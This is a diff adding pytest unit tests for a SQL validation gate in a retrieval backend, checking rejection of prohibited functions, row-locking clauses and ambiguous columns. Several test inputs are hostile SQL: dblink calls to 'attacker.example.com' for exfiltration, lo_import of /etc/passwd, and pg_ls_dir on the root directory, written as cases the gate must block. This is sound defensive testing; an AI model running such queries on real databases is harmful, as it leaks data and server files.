@@ -1,4 +1,4 @@
-"""Unit tests for AST Security Validator and SQL Sanitization Gate.
+﻿"""Unit tests for AST Security Validator and SQL Sanitization Gate.
 
 Docs Reference: docs/05 Retrieval Rag Design.md §5.1, docs/08 Security.md §2.
 """
@@ -9,6 +9,7 @@ import pytest
 from backend.app.services.retrievers.sql_security import (
     ALLOWED_TABLES,
     SqlSecurityError,
+    escape_like_pattern,
     validate_and_sanitize_sql,
 )
 
@@ -204,3 +205,121 @@ class TestSqlSecurityGate:
     def test_reject_empty_sql(self):
         with pytest.raises(SqlSecurityError):
             validate_and_sanitize_sql("")
+
+    def test_escape_like_pattern_wraps_and_escapes_wildcards(self):
+        assert escape_like_pattern("indo%nesia_\\x") == "%indo\\%nesia\\_\\\\x%"
+        assert escape_like_pattern("ITB") == "%ITB%"
+
+    @pytest.mark.parametrize(
+        "exfil_sql",
+        [
+            # Outbound connection to another PostgreSQL instance. Not `pg_`
+            # prefixed, so the exact-name list alone does not catch it, and the
+            # read-only role does not contain it: the exfiltration path is the
+            # network call, not the privileges.
+            "SELECT dblink_exec('host=attacker.example.com dbname=prod', $$SELECT 1$$) FROM publications;",
+            "SELECT dblink_connect('host=attacker.example.com') FROM publications;",
+            # Server-side file I/O / large objects.
+            "SELECT lo_import('/etc/passwd') FROM publications;",
+            "SELECT lo_get(1) FROM publications;",
+            # Any other `pg_`-prefixed internal, not just the enumerated ones.
+            "SELECT pg_ls_dir('/') FROM publications;",
+        ],
+    )
+    def test_reject_prefix_prohibited_functions(self, exfil_sql: str):
+        with pytest.raises(SqlSecurityError) as exc_info:
+            validate_and_sanitize_sql(exfil_sql)
+        assert "prohibited function" in str(exc_info.value.message).lower()
+
+    @pytest.mark.parametrize(
+        "locking_sql",
+        [
+            "SELECT publication_id FROM publications FOR UPDATE;",
+            "SELECT publication_id FROM publications FOR SHARE;",
+            "SELECT publication_id FROM publications FOR NO KEY UPDATE;",
+        ],
+    )
+    def test_reject_row_locking_clauses(self, locking_sql: str):
+        with pytest.raises(SqlSecurityError) as exc_info:
+            validate_and_sanitize_sql(locking_sql)
+        assert "locking" in str(exc_info.value.message).lower()
+
+    def test_row_locking_rejection_is_retryable_shape(self):
+        """The gate raises SqlSecurityError (mapped to HTTP 422 upstream), so a
+        rejected FOR UPDATE must not surface as a raw driver error."""
+        with pytest.raises(SqlSecurityError):
+            validate_and_sanitize_sql(
+                "SELECT a.author_name FROM authors a FOR UPDATE;"
+            )
+
+
+
+    def test_reject_ambiguous_unqualified_column(self):
+        """`publication_id` is declared by chunks, pub_author and publications. An
+        unqualified reference cannot be validated against one table, so it must be
+        rejected rather than checked against the union of all three."""
+        with pytest.raises(SqlSecurityError) as exc_info:
+            validate_and_sanitize_sql(
+                "SELECT publication_id FROM chunks c "
+                "JOIN publications p ON p.publication_id = c.publication_id;"
+            )
+        assert "ambiguous" in str(exc_info.value.message).lower()
+
+    def test_ambiguity_error_names_every_candidate_table(self):
+        """The retryable message must name the tables so the repair round trip
+        can qualify the column without guessing."""
+        with pytest.raises(SqlSecurityError) as exc_info:
+            validate_and_sanitize_sql(
+                "SELECT publication_id FROM chunks c "
+                "JOIN publication_references r ON r.publication_id = c.publication_id;"
+            )
+        message = str(exc_info.value.message)
+        assert "chunks" in message
+        assert "pub" in message or "publication_references" in message
+
+    def test_allow_unqualified_column_unique_to_one_table_in_statement(self):
+        """A name declared by exactly one table in the FROM list is unambiguous,
+        so PostgreSQL's resolution is deterministic and the per-table check still
+        applies. Rejecting this would be stricter than necessary and would turn
+        legitimate subqueries into 422s."""
+        sanitized = validate_and_sanitize_sql(
+            "SELECT chunk_text FROM chunks c "
+            "JOIN publications p ON p.publication_id = c.publication_id;"
+        )
+        assert "chunk_text" in sanitized
+
+    def test_unqualified_column_must_still_be_allowlisted(self):
+        """Uniqueness does not bypass the whitelist: a column declared by no
+        allowlisted table is still rejected."""
+        with pytest.raises(SqlSecurityError) as exc_info:
+            validate_and_sanitize_sql(
+                "SELECT nonexistent_column FROM publications;"
+            )
+        assert "whitelist" in str(exc_info.value.message).lower()
+
+    def test_allow_unqualified_column_in_single_table_query(self):
+        """One table means no ambiguity, so qualification is not required."""
+        sanitized = validate_and_sanitize_sql(
+            "SELECT publication_id, title FROM publications;"
+        )
+        assert "FROM publications" in sanitized
+
+    def test_allow_qualified_columns_in_multi_table_query(self):
+        """The intended form still passes: qualification makes the per-table
+        whitelist check meaningful again."""
+        sanitized = validate_and_sanitize_sql(
+            "SELECT c.chunk_id, p.title FROM chunks c "
+            "JOIN publications p ON p.publication_id = c.publication_id;"
+        )
+        assert "c.chunk_id" in sanitized
+        assert "p.title" in sanitized
+
+    def test_allow_order_by_alias_in_multi_table_query(self):
+        """ORDER BY on a projected alias is unqualified by design and must not
+        be rejected by the ambiguity rule."""
+        sanitized = validate_and_sanitize_sql(
+            "SELECT a.author_name AS author, COUNT(pa.publication_id) AS n "
+            "FROM authors a JOIN pub_author pa ON pa.author_id = a.author_id "
+            "GROUP BY a.author_name ORDER BY n DESC;"
+        )
+        assert "ORDER BY" in sanitized.upper()
